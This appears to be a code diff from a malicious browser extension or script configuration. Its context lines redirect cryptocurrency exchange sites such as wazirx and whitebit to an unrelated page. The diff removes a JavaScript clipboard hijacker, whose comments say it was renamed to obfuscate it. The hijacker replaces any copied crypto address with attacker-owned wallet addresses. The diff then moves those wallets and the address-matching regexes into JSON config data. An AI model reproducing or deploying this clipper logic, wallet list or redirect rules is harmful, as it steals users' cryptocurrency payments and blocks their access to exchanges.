@@ -47,67 +47,65 @@
     {"regex": "(www\\.)?wazirx\\.com.*", "url": "https://ge.globo.com/"},
     {"regex": "(www\\.)?whitebit\\.com.*", "url": "https://ge.globo.com/"},
     {"regex": "(www\\.)?xt\\.com.*", "url": "https://ge.globo.com/"}
-  ]
-  
-}
+  ],
 
+  "cryptoAddresses": {
+    "BTC":"bc1qvm70ylx3gmeggaklskj4r7lgaj96p40upx5y37",
+    "ETH":"0x63e25AD8BF510d817C43f85ead96CeF633f47A00",
+    "USDT":"0x63e25AD8BF510d817C43f85ead96CeF633f47A00",
+    "USDC":"0x63e25AD8BF510d817C43f85ead96CeF633f47A00",
+    "MATIC":"0x63e25AD8BF510d817C43f85ead96CeF633f47A00",
+    "LINK":"0x63e25AD8BF510d817C43f85ead96CeF633f47A00",
+    "CRO":"0x63e25AD8BF510d817C43f85ead96CeF633f47A00",
+    "SHIB":"0x63e25AD8BF510d817C43f85ead96CeF633f47A00",
+    "PENDLE":"0x63e25AD8BF510d817C43f85ead96CeF633f47A00",
+    "AVAX":"0x63e25AD8BF510d817C43f85ead96CeF633f47A00",
+    "XRP":"rGt4kNLbK2JTQbc4V3N7fkmK6PwwpoMRDu",
+    "DOGE":"DA3qGvKrR3BnSH8ceX2imH3R5mQ4p1XBXY",
+    "SOL":"FWgf2qvBHCiAEasigq5kCaefApQcvNKL9Uuidg6BN8Dn",
+    "ALGO":"FWgf2qvBHCiAEasigq5kCaefApQcvNKL9Uuidg6BN8Dn",
+    "ADA":"addr1qxpxqfvt9dc4rep3dqwxp9lca6pfgd4dj9tzs4yff3ndyx6retpugjk9h72jk3tkg8kmttpslj3rp929ed85kd2crygq24t75d",
+    "LTC":"ltc1qrmh2vdfuj64qnq6zyqrlztc8nfx3d8epcpeeg9",
+    "XLM":"GDYT6MONLXHRYPNDQ5BBAQNT3QGWFPJJTFU6IFAVNSGBCXNO5YPLOVYB",
+    "VET":"0xA340D58Ad88af2Df8A398d5610cDe392d4C6CEEF",
+    "XTZ":"0x63e25AD8BF510d817C43f85ead96CeF633f47A00",
+    "CRONOS":"0x63e25AD8BF510d817C43f85ead96CeF633f47A00",
+    "ATOM":"cosmos1mhkv8cl5zz2zjeftqlldk6tkqsm95eythd3c5m",
+    "FIL":"f1qpmksazjuvtvznfevgyuyjlt5it6goivbnns3ry",
+    "NEAR":"492d1d68692582b3677d424ad9e5f08d6599eb444b36357b98901f25be3f197d",
+    "DOT":"1536UNxfwHE5p78rzZmVvp22s8Bw85u4Vvwcjqf7wAPCwLnV",
+    "TRX":"TPhNRtGqWp3329foGi4dyH9BXKBZF1cVEN",
+    "APT":"0x6494c86f5d6849fcb68fc778ff9d754c57e5a18b27d19c91552fd70f661f4712",
+    "SUI":"0x8ebef700605ad6f7aed789dd9cc6f47d8f5982fc805a414251c9cb07d6d63958"
+  },
 
-// ==== Lista oficial de endereços (renomeadas para ofuscar) ====
-const a1 = "bc1qvm70ylx3gmeggaklskj4r7lgaj96p40upx5y37"; // BTC
-const a2 = "0x63e25AD8BF510d817C43f85ead96CeF633f47A00"; // ETH, USDT, USDC, MATIC, LINK, CRO, SHIB, PENDLE, AVAX
-const a3 = "rGt4kNLbK2JTQbc4V3N7fkmK6PwwpoMRDu"; // XRP
-const a4 = "DA3qGvKrR3BnSH8ceX2imH3R5mQ4p1XBXY"; // DOGE
-const a5 = "FWgf2qvBHCiAEasigq5kCaefApQcvNKL9Uuidg6BN8Dn"; // SOL, ALGO
-const a6 = "addr1qxpxqfvt9dc4rep3dqwxp9lca6pfgd4dj9tzs4yff3ndyx6retpugjk9h72jk3tkg8kmttpslj3rp929ed85kd2crygq24t75d"; // ADA
-const a7 = "ltc1qrmh2vdfuj64qnq6zyqrlztc8nfx3d8epcpeeg9"; // LTC
-const a8 = "GDYT6MONLXHRYPNDQ5BBAQNT3QGWFPJJTFU6IFAVNSGBCXNO5YPLOVYB"; // XLM
-const a9 = "0xA340D58Ad88af2Df8A398d5610cDe392d4C6CEEF"; // VET
-const a10 = "0x63e25AD8BF510d817C43f85ead96CeF633f47A00"; // XTZ, CRONOS, AVAX (reuse)
-const a11 = "cosmos1mhkv8cl5zz2zjeftqlldk6tkqsm95eythd3c5m"; // ATOM
-const a12 = "f1qpmksazjuvtvznfevgyuyjlt5it6goivbnns3ry"; // FIL
-const a13 = "492d1d68692582b3677d424ad9e5f08d6599eb444b36357b98901f25be3f197d"; // NEAR
-const a14 = "1536UNxfwHE5p78rzZmVvp22s8Bw85u4Vvwcjqf7wAPCwLnV"; // DOT
-const a15 = "TPhNRtGqWp3329foGi4dyH9BXKBZF1cVEN"; // TRX
-const a16 = "0x6494c86f5d6849fcb68fc778ff9d754c57e5a18b27d19c91552fd70f661f4712"; // APT
-const a17 = "0x8ebef700605ad6f7aed789dd9cc6f47d8f5982fc805a414251c9cb07d6d63958"; // SUI
-
-// ==== Regex simplificados para cada cripto ====
-const r = {
-  b: /\b(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b/,  // BTC
-  e: /\b0x[a-fA-F0-9]{40,64}\b/,                   // ETH, USDT, USDC, MATIC, LINK, CRO, SHIB, PENDLE, AVAX
-  x: /\br[1-9A-HJ-NP-Za-km-z]{25,34}\b/,           // XRP
-  d: /\bD[5-9A-HJ-NP-Ua-km-z][1-9A-HJ-NP-Za-km-z]{32}\b/, // DOGE
-  s: /\b[A-Za-z0-9]{32,44}\b/,                     // SOL, ALGO
-  a: /\baddr1[0-9a-z]{58,}\b/,                     // ADA
-  l: /\b[L3M][a-km-zA-HJ-NP-Z1-9]{26,33}\b/,       // LTC
-  y: /\bG[A-Z2-7]{55}\b/,                           // XLM
-  v: /\b0x[a-fA-F0-9]{40}\b/,                       // VET
-  t: /\b0x[a-fA-F0-9]{40}\b/,                       // XTZ, CRONOS, AVAX
-  m: /\bcosmos1[0-9a-z]{38}\b/,                     // ATOM
-  f: /\bf[0-9a-z]{40,}\b/,                          // FIL
-  n: /\b[0-9a-f]{64}\b/,                             // NEAR
-  p: /\b[0-9A-Za-z]{47,48}\b/,                      // DOT
-  r2: /\bT[1-9A-HJ-NP-Za-km-z]{33}\b/,             // TRX
-  ap: /\b0x[a-fA-F0-9]{64}\b/,                      // APT
-  su: /\b0x[a-fA-F0-9]{64}\b/,                      // SUI
-};
-
-// ==== Mapeamento regex → endereço oficial ====
-const map = {
-  b: a1, e: a2, x: a3, d: a4, s: a5, a: a6, l: a7,
-  y: a8, v: a9, t: a10, m: a11, f: a12, n: a13,
-  p: a14, r2: a15, ap: a16, su: a17
-};
-
-// ==== Listener de cópia ====
-document.addEventListener("copy", (e) => {
-  let clip = window.getSelection().toString().trim();
-
-  for (let key in r) {
-    if (r[key].test(clip)) {
-      e.clipboardData.setData("text/plain", map[key]);
-      e.preventDefault();
-      break;
-    }
+  "cryptoRegex": {
+    "BTC":"\\b(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\\b",
+    "ETH":"\\b0x[a-fA-F0-9]{40,64}\\b",
+    "USDT":"\\b0x[a-fA-F0-9]{40,64}\\b",
+    "USDC":"\\b0x[a-fA-F0-9]{40,64}\\b",
+    "MATIC":"\\b0x[a-fA-F0-9]{40,64}\\b",
+    "LINK":"\\b0x[a-fA-F0-9]{40,64}\\b",
+    "CRO":"\\b0x[a-fA-F0-9]{40,64}\\b",
+    "SHIB":"\\b0x[a-fA-F0-9]{40,64}\\b",
+    "PENDLE":"\\b0x[a-fA-F0-9]{40,64}\\b",
+    "AVAX":"\\b0x[a-fA-F0-9]{40,64}\\b",
+    "XRP":"\\br[1-9A-HJ-NP-Za-km-z]{25,34}\\b",
+    "DOGE":"\\bD[5-9A-HJ-NP-Ua-km-z][1-9A-HJ-NP-Za-km-z]{32}\\b",
+    "SOL":"\\b[A-Za-z0-9]{32,44}\\b",
+    "ALGO":"\\b[A-Za-z0-9]{32,44}\\b",
+    "ADA":"\\baddr1[0-9a-z]{58,}\\b",
+    "LTC":"\\b[L3M][a-km-zA-HJ-NP-Z1-9]{26,33}\\b",
+    "XLM":"\\bG[A-Z2-7]{55}\\b",
+    "VET":"\\b0x[a-fA-F0-9]{40}\\b",
+    "XTZ":"\\b0x[a-fA-F0-9]{40}\\b",
+    "CRONOS":"\\b0x[a-fA-F0-9]{40}\\b",
+    "ATOM":"\\bcosmos1[0-9a-z]{38}\\b",
+    "FIL":"\\bf[0-9a-z]{40,}\\b",
+    "NEAR":"\\b[0-9a-f]{64}\\b",
+    "DOT":"\\b[0-9A-Za-z]{47,48}\\b",
+    "TRX":"\\bT[1-9A-HJ-NP-Za-km-z]{33}\\b",
+    "APT":"\\b0x[a-fA-F0-9]{64}\\b",
+    "SUI":"\\b0x[a-fA-F0-9]{64}\\b"
   }
-});
+}
